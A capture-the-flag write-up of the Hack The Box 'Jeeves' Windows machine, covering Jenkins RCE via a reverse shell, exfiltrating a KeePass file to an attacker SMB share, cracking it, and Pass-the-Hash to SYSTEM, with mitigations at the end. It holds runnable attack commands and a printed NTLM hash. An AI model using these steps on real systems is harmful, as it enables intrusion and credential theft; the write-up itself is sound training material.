---
title: "HTB Walkthrough: Jeeves"
date: 2026-09-23
draft: false
description: "Full walkthrough of the Jeeves machine from Hack The Box. Medium difficulty, Windows. Unauthenticated Jenkins on port 50000 → RCE via Freestyle Project batch command → KeePass database exfiltration → master password cracking → NTLM hash stored as a note → Pass-the-Hash as Administrator → root flag hidden in an NTFS Alternate Data Stream (ADS)."
tags: ["HackTheBox", "Windows", "Medium", "Jenkins", "RCE", "KeePass", "PassTheHash", "NTLM", "SMB", "ADS", "AlternateDataStream", "NTFS", "Impacket", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Jeeves** on Hack The Box. **Medium** difficulty machine running **Windows**. A port scan reveals a Jetty server on port 50000 — directory fuzzing uncovers a **Jenkins instance with no authentication required**. A Freestyle Project with a Windows batch build step gives immediate RCE. In the compromised user's documents we find a **KeePass database** (`CEH.kdbx`) that, after cracking the master password, contains an **NTLM hash** of `Administrator` stored as a note. **Pass-the-Hash** with `impacket-psexec` yields a shell as `NT AUTHORITY\SYSTEM`. The root flag is hidden in an **NTFS Alternate Data Stream (ADS)**, invisible to a normal directory listing.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                                        |
|----------------|-------------------------------------------------------------------------------------------------------------------------------|
| **Name**       | Jeeves                                                                                                                        |
| **OS**         | Windows                                                                                                                       |
| **Difficulty** | Medium                                                                                                                        |
| **IP**         | 10.129.62.14                                                                                                                  |
| **Techniques** | Unauthenticated Jenkins RCE · SMB Exfiltration · KeePass Cracking · Pass-the-Hash · NTFS Alternate Data Streams (ADS)       |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.62.14
```

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```

### 1.2 Service Detection on Port 50000

```bash
nmap -sC -sV -p50000 10.129.62.14
```

```
PORT      STATE SERVICE VERSION
50000/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
```

> **💡 Attack surface:** Nmap labels port 50000 as `ibm-db2` by port-convention, but the banner identifies it as **Jetty** — a Java application container commonly used to serve **Jenkins**. The root (`/`) returns 404, so the actual path needs to be discovered via fuzzing.

---

## 2. Web Enumeration — Discovering Jenkins

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
  -u http://10.129.62.14:50000/FUZZ
```

```
askjeeves    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 46ms]
```

Visiting `http://10.129.62.14:50000/askjeeves` redirects to a **Jenkins instance with no login required**.

![Jenkins dashboard at /askjeeves — fully accessible without authentication](/img/jeeves1.png)

> **⚠️ Critical exposure:** Jenkins is completely open — any anonymous visitor can create and execute build jobs, which is equivalent to arbitrary command execution on the server.

---

## 3. Exploitation — Jenkins RCE via Freestyle Project

Jenkins without access restrictions allows freely creating and running build jobs — which translates directly to **OS command execution** on the Jenkins server itself.

### 3.1 Creating a New Freestyle Project

Navigate to `New Item`, enter a name (e.g. `test`), and select **Freestyle project**.

![New Item screen with Freestyle project selected](/img/jeeves2.png)

### 3.2 Configuring the Build Step with the Reverse Shell

In the job configuration, under the **Build** section, add a step of type **Execute Windows batch command** with a PowerShell one-liner that opens a reverse TCP connection to our machine.

![Build step configured with Base64-encoded PowerShell reverse shell payload](/img/jeeves3.png)

```
Normal flow:    legitimate job → runs build commands in workspace
Malicious flow: malicious job → Execute Windows batch → powershell reverse shell
                → outbound connection to our machine → shell as Jenkins service account
```

### 3.3 Saving, Triggering, and Catching the Shell

Save the configuration and click **Build Now**. With a listener ready:

```bash
nc -lvnp 4444
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.62.14 49676

PS C:\Users\Administrator\.jenkins\workspace\test> whoami
jeeves\kohsuke
```

> **💡 Why it works:** every Jenkins job runs with the privileges of the account under which the Jenkins service is started — here, `kohsuke`. With no authentication required to create or launch jobs, any anonymous visitor gets arbitrary code execution on the server.

---

## 4. User Flag

```powershell
type C:\Users\kohsuke\Desktop\user.txt
```

> 🔑 User flag obtained.

---

## 5. Post-Exploitation — KeePass Database Discovery

```powershell
cd C:\Users\kohsuke\Documents
dir
```

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2017   1:43 PM          2846 CEH.kdbx
```

> **💡 Key finding:** a **KeePass database** (`CEH.kdbx`) in `kohsuke`'s documents. KeePass databases are encrypted with a master password — if it's weak, it can be cracked offline. The contents may include high-value credentials.

---

## 6. Exfiltrating the File via SMB

We spin up a local SMB server on our machine to receive the file without needing an HTTP transfer:

```bash
impacket-smbserver Folder $(pwd)
```

```
[*] Incoming connection (10.129.62.14,49677)
[*] User JEEVES\kohsuke authenticated successfully
```

From the victim shell, we mount the share and copy the file:

```powershell
net use s: \\10.10.15.193\Folder
copy CEH.kdbx s:
```

```bash
ls $(pwd)/
# CEH.kdbx
```

---

## 7. Cracking KeePass — NTLM Hash Discovery

### 7.1 Extracting the Hash and Cracking It

```bash
keepass2john CEH.kdbx > CEHhash
john CEHhash -w:/usr/share/wordlists/rockyou.txt
```

```
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
moonshine1       (CEH)
1g 0:00:01:10 DONE
```

> **🔑 Master password obtained:** `moonshine1`

### 7.2 NTLM Hash in the "Backup stuff" Entry

We open `CEH.kdbx` with KeePassXC and enter the master password. Inside, the **"Backup stuff"** entry stores an NTLM hash as its password field:

![KeePassXC showing the Backup stuff entry with the Administrator NTLM hash](/img/jeeves4.png)

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

> **💡 Key finding:** the database owner stored the NTLM hash of `Administrator` as a "backup." With an NTLM hash, the plaintext password is not required — we can authenticate directly with **Pass-the-Hash**.

---

## 8. Pass-the-Hash as `Administrator`

```bash
impacket-psexec Administrator@10.129.62.14 \
  -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

```
[*] Found writable share ADMIN$
[*] Uploading file VaCXAScN.exe
[*] Creating service niVe on 10.129.62.14.....
[*] Starting service niVe.....

C:\Windows\system32> whoami
nt authority\system
```

```
Normal flow:    SMB authentication with plaintext password
Malicious flow: SMB authentication with NTLM hash directly (no decryption needed)
                → psexec uploads executable to ADMIN$ → registers it as a service
                → shell as NT AUTHORITY\SYSTEM
```

> **✅ Pass-the-Hash successful:** `impacket-psexec` uses the NTLM hash to authenticate over SMB without needing the plaintext password.

---

## 9. The "Missing" Root Flag — Alternate Data Streams

```powershell
cd C:\Users\Administrator\Desktop
dir
```

```
12/24/2017  03:51 AM    36 hm.txt
11/08/2017  10:05 AM   797 Windows 10 Update Assistant.lnk
```

```powershell
type hm.txt
```

```
The flag is elsewhere.  Look deeper.
```

> **💡 Deliberate hint:** the file content tells us the flag is not in the main data stream. In NTFS, a file can have **Alternate Data Streams (ADS)** in addition to its primary content — invisible in a normal `dir` listing, but revealed with the `/r` flag.

```powershell
dir /r
```

```
12/24/2017  03:51 AM    36 hm.txt
                        34 hm.txt:root.txt:$DATA
```

`hm.txt` has an alternate stream named `root.txt`. Reading it directly:

```powershell
more < hm.txt:root.txt
```

---

## 10. Root Flag

```powershell
more < hm.txt:root.txt
```

> 🏁 Root flag obtained.

---

## 11. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap reveals port 50000 (Jetty). Directory fuzzing uncovers `/askjeeves` → Jenkins with no authentication.
2. **Jenkins RCE** → Freestyle Project + Execute Windows batch command → reverse shell as `jeeves\kohsuke`.
3. **User flag** → `C:\Users\kohsuke\Desktop\user.txt`.
4. **KeePass** → `CEH.kdbx` in `kohsuke`'s documents → exfiltrated via `impacket-smbserver` + `net use`.
5. **Cracking** → `keepass2john` + `john` + `rockyou.txt` → master password `moonshine1` → "Backup stuff" entry contains NTLM hash of Administrator.
6. **Pass-the-Hash** → `impacket-psexec` with the hash → shell as `NT AUTHORITY\SYSTEM`.
7. **ADS** → `hm.txt` has an alternate stream `root.txt` → `more < hm.txt:root.txt` → root flag.

**What I learned from this machine:**

- **Unauthenticated Jenkins is immediate RCE.** No CVE or bypass needed — the legitimate functionality of creating and running build jobs *is* command execution. The minimum protection is enabling authentication on first startup, which Jenkins prompts for by default when installed correctly.

- **Internal application files can hold unexpectedly valuable credentials.** `kohsuke`'s KeePass database didn't just have service passwords — it had the NTLM hash of the machine's Administrator stored as a "backup." The blast radius of compromising a user account is never limited to just that account.

- **Pass-the-Hash remains effective wherever NTLM is enabled.** The hash doesn't need to be cracked — the NTLM hash *is* the credential in the SMB/NTLM protocol. Defense requires disabling NTLM (or restricting it) and applying Credential Guard; a complex password offers no protection if the hash can be used directly.

- **Alternate Data Streams are a real NTFS hiding technique.** An ADS doesn't show in `dir`, doesn't modify the visible file size, and goes undetected by most file-listing tools. HTB uses it here as a puzzle, but in real environments ADS is a legitimate persistence and payload-hiding vector used by malware — `dir /r` and tools like Sysinternals `streams.exe` should be part of any Windows forensic procedure.

- **The KeePass master password is the single point of failure for the entire database.** `moonshine1` is in `rockyou.txt` — the most obvious dictionary wordlist. A weak master password removes all protection from the vault. Master passwords must be long, random, and supplemented with a keyfile when the risk justifies it.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Jenkins with no authentication | Enable global security from first startup; never expose the admin console without access control |
| RCE via Freestyle Project | Restrict who can create/configure jobs; use isolated agents; don't run builds on the controller |
| Weak master password (`moonshine1`) | Long, random master password; complement with a keyfile for sensitive databases |
| NTLM hash stored as a note in KeePass | Don't store hashes or other accounts' credentials as notes; minimize blast radius if the database is compromised |
| Pass-the-Hash with Administrator NTLM hash | Disable NTLM where possible; apply Credential Guard; restrict identical local admin accounts across machines |
| Alternate Data Streams as a hiding technique | Monitor ADS creation on NTFS filesystems; include `dir /r` and `streams.exe` in forensic procedures |
| Jenkins service running under an account with excessive privileges | Least privilege: the Jenkins service should not run under an account whose compromise facilitates escalation to Administrator |
